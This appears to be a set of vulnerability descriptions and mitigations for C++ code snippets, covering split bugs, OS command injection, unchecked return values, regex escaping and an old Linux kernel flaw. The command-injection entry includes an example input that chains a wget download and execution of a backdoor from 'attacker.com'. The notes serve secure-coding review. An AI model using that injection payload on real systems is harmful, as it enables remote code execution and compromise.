vulndetails.description:
when we use null terminator (`\0`) as splitter argument, function wouldn't able to handle it since it'll parse \0 as end of string.
**example**:
`split("PART1\x00PART2", "\x00");`
it returns `PART1` while it should return both `PART1` and `PART2`.
vulndetails.mitigations: [C++ Reference(with code snippet)](https://en.cppreference.com/w/cpp/io/basic_streambuf/setg)

1. To use `lower_s` in `transform` function we should have same size with `s` variable.
2. We need to update `lower_s` after each replace too, because we just replaced words in `s` and `lower_s` does not change, so it'll return same value always.
**example:**
`subTag("blahblah","blah","new");` , infinite loop occur.

vulndetails.description:
This function is vulnerable to code injection (OS command injection) attacks when user inputs are involved without.
You can't also check errors of executed commands in this answer.
Example attack:
Suppose that user is asked to enter an IP address to ping and program will then concat "ping " with received IP address which will result in "ping 1.1.1.1". Attacker might add `;` to add a new command after `;` which will result in OS command injection. Example input:
"ping 1.1.1.1 ; wget http://attacker.com/backdoor; ./backdoor"
vulndetails.mitigations:
Option 1: Best solution is to use `pstreams` instead of popen: https://stackoverflow.com/a/10702464
Option 2: Clear all dangerous characters from function(not always possible).
Option 3: Create a white list for possible commands.

According to [docs](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-enumwindows):
> Return Value
> Type: Type: BOOL
> If the function succeeds, the return value is nonzero.
> If the function fails, the return value is zero. To get extended error information, call GetLastError.
> If EnumWindowsProc returns zero, the return value is also zero. In this case, the callback function should call SetLastError to obtain a meaningful error code to be returned to the caller of EnumWindows.
`EnumWindows` function might fail but return value of this function has not been checked
vulndetails.mitigations: Check return value of `EnumWindows` function and needed action if it was false.

vulndetails.description:
This code snippet only works when are characters are in ASCII.
Please do never assume characters are ASCII specially when there is user input involved, You can see one of a reasons [here](https://security.stackexchange.com/a/133970/39676)
vulndetails.mitigations: Use `boost::locale::to_lower` which works well on UTF8 too. [More info](https://www.boost.org/doc/libs/1_51_0/libs/locale/doc/html/conversions.html).

Reading variable from ENV is not safe at all, because it can be bypassed easily by setting new value for `PWD` in shell ( like bash ).
**example:**
Suppose current directory is : `/tmp` , now run the program:
```
$ ./prog
Working directory : /tmp
```
Let's change `PWD` value in the environment:
```
$ export PWD=/anywhere
```
Run the program again:
```
$ ./prog
Working directory : /anywhere
```
vulndetails.mitigations:
Use this [answer](https://stackoverflow.com/a/7403075/3686236):
`QDir::currentPath()`

As mentioned in [docs](https://www.boost.org/doc/libs/1_66_0/libs/regex/doc/html/boost_regex/syntax.html):
> Perl (this is the default behavior).
So boost will use `perl` style regex as default, Charset used for this [syntax](https://www.boost.org/doc/libs/1_66_0/libs/regex/doc/html/boost_regex/syntax/perl_syntax.html) is:
> .[{}()\*+?|^$
As we can see `{` and `}` are not escaped in this function, So if user enter an string like `invalid{regex` it can crash the program or craft some regexes based on situation.

The `sysctl` functionality (sysctl.c) in Linux kernel before `2.6.14.1` allows local users to cause a denial of service (kernel oops) and possibly execute code by opening an interface file in `/proc/sys/net/ipv4/conf/`, waiting until the interface is unregistered, then obtaining and modifying function pointers in memory that was used for the `ctl_table`.
vulndetails.mitigations: Make sure your kernel version is higher than `2.6.14.1`.

When we use null terminator (`\0`) as splitter argument, function wouldn't able to handle it since it'll parse \0 as end of string.
**example**:
`split<wstring>("PART1\x00PART2", "\x00");`
it returns `PART1` while it should return both `PART1` and `PART2`.
vulndetails.mitigations: [C++ Reference(with code snippet)](https://en.cppreference.com/w/cpp/io/basic_streambuf/setg)
